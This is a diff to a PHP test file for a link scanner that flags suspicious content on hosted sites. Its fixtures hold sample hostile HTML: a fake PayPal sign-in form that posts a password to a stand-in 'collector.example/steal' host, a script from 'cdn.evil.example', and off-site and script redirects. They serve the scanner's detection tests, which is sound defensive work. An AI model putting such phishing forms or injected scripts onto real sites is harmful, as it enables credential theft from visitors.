@@ -61,8 +61,11 @@ class LinkScannerTest extends TestCase
         $this->pages(['https://shopx.codeinchrome.com/' => '<meta http-equiv="refresh" content="0; url=https://elsewhere.example/">'
             .'<a href="https://bit.ly/abc">Deal</a><a href="http://203.0.113.9/x">x</a><a href="https://mirror.example/pack.zip">zip</a>'
             .'<h1>Sign in to your PayPal account</h1><form method="post" action="https://collector.example/steal"><input type="password" name="pw"></form>']);
-        $review = implode("\n", app(LinkScanner::class)->scan($this->site())['review']);
-        foreach (['sends visitors on to another site', 'URL shortener', 'bare IP address', 'archive elsewhere',
+        $r = app(LinkScanner::class)->scan($this->site());
+        $review = implode("\n", $r['review']);
+        // A meta refresh to another site is what the edge refuses as a header: a ban (the audit, 2026-09-25).
+        $this->assertStringContainsString('meta refresh: https://elsewhere.example/', implode("\n", $r['ban']));
+        foreach (['URL shortener', 'bare IP address', 'archive elsewhere',
             'a form posts what is typed to another site: collector.example', 'names "paypal": possible phishing'] as $want) {
             $this->assertStringContainsString($want, $review);
         }
@@ -72,9 +75,9 @@ class LinkScannerTest extends TestCase
     {
         $this->pages(['https://shopx.codeinchrome.com/' => '<form method="post" action="https://store.lemonsqueezy.com/checkout/buy/abc"><button>Buy</button></form>'
             .'<meta http-equiv="refresh" content="0; url=https://attacker-store.lemonsqueezy.com/">']);
-        $review = app(LinkScanner::class)->scan($this->site())['review'];
-        $this->assertCount(1, $review, 'the checkout is fine; any other store page under lemonsqueezy.com is not');
-        $this->assertStringContainsString('attacker-store.lemonsqueezy.com', $review[0]);
+        $r = app(LinkScanner::class)->scan($this->site());
+        $this->assertSame([], $r['review'], 'the checkout is fine');
+        $this->assertStringContainsString('attacker-store.lemonsqueezy.com', implode("\n", $r['ban']), 'any other store page is a redirect elsewhere');
     }
 
     public function test_the_command_bans_on_downloads_reports_the_rest_and_gates_explore(): void
@@ -101,7 +104,7 @@ class LinkScannerTest extends TestCase
         app(\App\Showcase\Explore::class)->refresh();
         $this->assertSame([], app(\App\Showcase\Explore::class)->listed(), 'not scanned yet: not listed');
 
-        $site->forceFill(['scanned_clean_at' => now(), 'links_clean_at' => now()])->save();
+        $site->forceFill(['scanned_clean_at' => now(), 'links_clean_at' => now(), 'created_at' => now()->subDays(8)])->save();
         app(\App\Showcase\Explore::class)->refresh();
         $this->assertSame(['listed.codeinchrome.com'], app(\App\Showcase\Explore::class)->listed());
 
@@ -144,5 +147,26 @@ class LinkScannerTest extends TestCase
         $r = app(LinkScanner::class)->scan($this->site());
         $this->assertSame([], $r['ban']);
         $this->assertSame([], $r['review']);
+    }
+
+    public function test_iframes_scripts_and_script_redirects_to_other_sites_are_reviewed_and_it_looks_like_a_browser(): void
+    {
+        $seen = [];
+        Http::fake(function (\Illuminate\Http\Client\Request $r) use (&$seen) {
+            if (str_contains($r->url(), 'shopx.codeinchrome.com')) { // the site's pages, not the agent's route list
+                $seen[] = $r->header('User-Agent')[0] ?? '';
+            }
+            return Http::response('<iframe src="https://kit.example/login"></iframe><script src="https://cdn.evil.example/x.js"></script>'
+                .'<script>setTimeout(() => { window.location.href = "https://kit.example/next"; }, 10)</script>'
+                .'<script src="https://checkout.stripe.com/v3"></script>', 200, ['Content-Type' => 'text/html']);
+        });
+        $review = implode("\n", app(LinkScanner::class)->scan($this->site())['review']);
+        foreach (['frames another site: https://kit.example/login', 'runs a script from another site: https://cdn.evil.example/x.js',
+            'from a script: https://kit.example/next'] as $want) {
+            $this->assertStringContainsString($want, $review);
+        }
+        $this->assertStringNotContainsString('stripe', $review, 'an allowed provider is fine');
+        $this->assertStringStartsWith('Mozilla/5.0', $seen[0], 'no self-identifying User-Agent');
+        $this->assertStringNotContainsString('codeinchrome', $seen[0]);
     }
 }
